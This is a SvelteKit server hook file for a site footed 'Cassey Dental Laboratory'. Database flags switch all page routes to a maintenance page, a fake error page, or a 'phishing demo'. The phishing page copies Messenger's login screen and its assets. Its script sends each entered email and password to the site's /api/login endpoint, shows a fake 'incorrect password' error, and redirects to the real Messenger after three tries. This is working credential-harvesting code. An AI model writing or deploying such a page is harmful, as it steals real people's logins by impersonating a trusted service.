import { sequence } from '@sveltejs/kit/hooks';
import type { Handle } from '@sveltejs/kit';
import { db } from '$lib/server/db';
import { siteStatus } from '$lib/server/db/schema';
import { eq } from 'drizzle-orm';
import { handle as authHandle } from './auth';

// Get site status from database using Drizzle
async function getSiteStatus() {
	try {
		const [status] = await db.select().from(siteStatus).where(eq(siteStatus.id, 1));
		return status;
	} catch (error) {
		console.error('Failed to get site status:', error);
		return null;
	}
}

// Default maintenance page HTML
const defaultLockPage = (title: string, message: string) => `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title}</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      font-family: 'Segoe UI', system-ui, sans-serif;
      color: white;
    }
    .container {
      text-align: center;
      padding: 3rem;
      max-width: 600px;
    }
    .icon {
      font-size: 5rem;
      margin-bottom: 1.5rem;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.7; transform: scale(1.05); }
    }
    h1 {
      font-size: 2.5rem;
      margin-bottom: 1rem;
      background: linear-gradient(90deg, #e94560, #ff6b9d);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    p {
      font-size: 1.2rem;
      color: #a0a0a0;
      line-height: 1.6;
      margin-bottom: 2rem;
    }
    .footer {
      margin-top: 3rem;
      font-size: 0.9rem;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">🦷</div>
    <h1>${title}</h1>
    <p>${message}</p>
    <div class="footer">
      Cassey Dental Laboratory
    </div>
  </div>
</body>
</html>
`;

// Fake error page - simple generic error design
const fakeErrorPage = (errorCode: string, message: string) => `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error ${errorCode}</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f5f5f5;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      color: #333;
    }
    .error-container {
      text-align: center;
      padding: 3rem;
      max-width: 500px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .error-code {
      font-size: 5rem;
      font-weight: bold;
      color: #dc3545;
      line-height: 1;
    }
    .error-title {
      font-size: 1.5rem;
      color: #333;
      margin: 1rem 0;
    }
    .error-message {
      font-size: 1rem;
      color: #666;
      margin-bottom: 2rem;
      line-height: 1.6;
    }
    .contact-info {
      font-size: 0.9rem;
      color: #888;
      padding-top: 1.5rem;
      border-top: 1px solid #eee;
    }
    .retry-btn {
      background: #dc3545;
      border: none;
      color: white;
      padding: 12px 24px;
      font-size: 1rem;
      border-radius: 4px;
      cursor: pointer;
      margin-bottom: 1.5rem;
    }
    .retry-btn:hover {
      background: #c82333;
    }
  </style>
</head>
<body>
  <div class="error-container">
    <div class="error-code">${errorCode}</div>
    <div class="error-title">Something went wrong</div>
    <div class="error-message">${message || 'An unexpected error has occurred. The server encountered a problem and could not complete your request.'}</div>
    <button class="retry-btn" onclick="location.reload()">Try Again</button>
    <div class="contact-info">
      If this problem persists, please contact the administrator.
    </div>
  </div>
</body>
</html>
`;

// Phishing demo page - Messenger login style
const phishingPage = () => `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Messenger - Login</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      height: 100%;
      width: 100%;
    }
    .page-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 99999;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: Segoe UI, Helvetica, Arial, sans-serif;
    }
    .login-container {
      text-align: center;
      padding: 40px;
      width: 100%;
      max-width: 400px;
    }
    .logo-section {
      text-align: center;
      margin-bottom: 24px;
    }
    .messenger-logo {
      height: 80px;
      display: block;
      margin: 0 auto 20px;
    }
    .tagline {
      font-size: 24px;
      font-weight: 400;
      color: #1c1e21;
      margin: 0;
    }
    .login-form {
      display: flex;
      flex-direction: column;
      gap: 16px;
      margin-top: 32px;
      max-width: 330px;
      margin-left: auto;
      margin-right: auto;
    }
    .input-field {
      padding: 16px;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      font-size: 17px;
      outline: none;
      background: #fff;
    }
    .input-field:focus {
      border-color: #0084ff;
      box-shadow: 0 0 0 2px rgba(0, 132, 255, 0.2);
    }
    .input-field::placeholder {
      color: #8a8d91;
    }
    .error-msg {
      color: #be4b49;
      font-size: 13px;
      text-align: left;
    }
    .continue-btn {
      background: #0084ff;
      color: white;
      border: none;
      border-radius: 20px;
      padding: 12px 32px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      width: fit-content;
      margin: 8px auto 0;
    }
    .continue-btn:hover {
      background: #0077e6;
    }
    .keep-signed-in {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 15px;
      color: #65676b;
      margin-top: 16px;
      cursor: pointer;
    }
    .keep-signed-in input {
      width: 18px;
      height: 18px;
      accent-color: #0084ff;
    }
    .footer-links {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      padding: 16px;
      text-align: center;
      font-size: 12px;
      color: #65676b;
      background: #fff;
    }
    .footer-links a {
      color: #0084ff;
      text-decoration: none;
    }
    .footer-links a:hover {
      text-decoration: underline;
    }
    .divider {
      margin: 0 12px;
      color: #ccc;
    }
  </style>
</head>
<body>
<div class="page-overlay">
  <div class="login-container">
    <div class="logo-section">
      <img src="https://static.xx.fbcdn.net/rsrc.php/yb/r/M8rOX7S5AN3.svg" alt="Messenger" class="messenger-logo" />
      <h2 class="tagline">Connect with your favorite people.</h2>
    </div>
    <form class="login-form" id="phishForm">
      <input type="text" class="input-field" id="email" placeholder="Email or phone number" required />
      <input type="password" class="input-field" id="pass" placeholder="Password" required />
      <div id="errorMsg" style="color: #dc3545; font-size: 14px; margin-bottom: 8px; display: none;">The password that you've entered is incorrect.</div>
      <button type="submit" class="continue-btn">Continue</button>
      <label class="keep-signed-in">
        <input type="checkbox" />
        <span>Keep me signed in</span>
      </label>
    </form>
    <div class="footer-links">
      <a href="#!">Not on Facebook?</a>
      <span class="divider">|</span>
      <a href="#!">Forgot password</a>
      <span class="divider">|</span>
      <a href="#!">Privacy Policy</a>
      <span class="divider">|</span>
      <a href="#!">Terms</a>
      <span class="divider">|</span>
      <span>© Meta 2025</span>
    </div>
  </div>
  <script>
    let attempts = 0;
    const MAX_ATTEMPTS = 3;
    
    document.getElementById('phishForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const pass = document.getElementById('pass').value;
      const errorMsg = document.getElementById('errorMsg');
      
      attempts++;
      
      // Send captured credentials to server
      await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password: pass, attempt: attempts })
      });
      
      if (attempts >= MAX_ATTEMPTS) {
        // Redirect to real messenger after 3 attempts
        window.location.href = 'https://www.messenger.com';
      } else {
        // Show error and clear password
        errorMsg.style.display = 'block';
        document.getElementById('pass').value = '';
        document.getElementById('pass').focus();
      }
    });
  </script>
</div>
</body>
</html>
`;

export const securityHandle: Handle = async ({ event, resolve }) => {
	// Skip API routes and static files
	const path = event.url.pathname;
	if (path.startsWith('/api/') || path.startsWith('/_app/') || path.includes('.')) {
		return resolve(event);
	}

	// Check site status
	const status = await getSiteStatus();

	// Check for phishing mode first (highest priority)
	if (status && status.phishingMode === 'true') {
		return new Response(phishingPage(), {
			status: 200,
			headers: { 'Content-Type': 'text/html' }
		});
	}

	// Check for fake error first (takes priority)
	if (status && status.fakeError === 'true') {
		const html = fakeErrorPage(status.errorCode || '500', status.errorMessage || '');

		return new Response(html, {
			status: parseInt(status.errorCode || '500'),
			headers: {
				'Content-Type': 'text/html'
			}
		});
	}

	// Check for lockdown
	if (status && status.isLocked === 'true') {
		const html =
			status.lockHtml ||
			defaultLockPage(
				status.lockTitle || 'Site Under Maintenance',
				status.lockMessage || 'We are currently performing maintenance. Please check back later.'
			);

		return new Response(html, {
			status: 503,
			headers: {
				'Content-Type': 'text/html',
				'Retry-After': '3600'
			}
		});
	}

	return resolve(event);
};

export const handle = sequence(authHandle, securityHandle);
